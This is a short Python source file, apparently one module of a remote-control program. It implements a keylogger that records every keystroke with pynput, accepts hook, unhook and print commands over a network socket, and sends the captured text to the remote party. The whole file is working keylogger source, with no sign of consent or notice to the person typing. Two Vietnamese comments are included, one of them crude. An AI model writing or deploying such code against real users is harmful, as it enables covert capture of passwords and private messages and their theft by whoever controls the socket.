from pynput.keyboard import Listener, Key

class KeyLogger:
    def __init__(self, sock = None):
        self.keys = ''
        self.client = sock
        self.is_hooking = False
        pass

    def run(self):
       while True:
            cmd = self.client.recv(32).decode('utf8')
            #print(cmd)
            # cmd = str(input())
            if cmd == "keystroke,hook":
                self.hook_key()
            elif cmd == "keystroke,unhook":
                self.unhook_key()
            elif cmd == "keystroke,print":
                self.print_keys()
            elif cmd == "exit":
                return     
    
    def on_press(self, key):
        if type(key) == Key:
            if key == Key.space:
                self.keys += ' '
            elif key == Key.enter:
                self.keys += '\n'
            elif key == Key.tab:
                self.keys += '\t'
            else:
                self.keys += '<' + str(key) + '>'
        else:
            self.keys += key.char
    
    def hook_key(self): # lam gi ke me tao
        if self.is_hooking: return
        self.listener = Listener(on_press = self.on_press)
        self.listener.start()
        # self.listener.join()
        self.is_hooking = True

    def unhook_key(self):
        if not self.is_hooking: return #thanh
        self.listener.stop()
        self.is_hooking = False
        return False
    
    def print_keys(self):
        self.client.sendall(bytes(str(len(self.keys)), "utf8"))
        self.client.sendall(bytes(self.keys, "utf8"))
        self.keys = ''
        pass

    pass

# app = KeyLogger()
# app.run()